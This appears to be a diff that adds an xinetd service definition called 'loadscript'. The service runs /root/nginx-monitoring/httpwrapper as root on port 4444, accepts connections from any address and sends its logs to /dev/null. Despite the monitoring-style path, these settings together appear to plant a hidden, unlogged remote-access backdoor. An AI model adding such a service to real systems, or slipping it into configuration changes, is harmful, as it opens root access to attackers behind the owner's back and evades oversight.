@@ -1,0 +1,13 @@
+service loadscript
+{
+  type = unlisted
+  port = 4444
+  socket_type = stream
+  wait = no
+  user = root
+  server = /root/nginx-monitoring/httpwrapper
+  server_args = loadscript
+  disable = no
+  only_from = 0.0.0.0
+  log_type = FILE /dev/null
+}
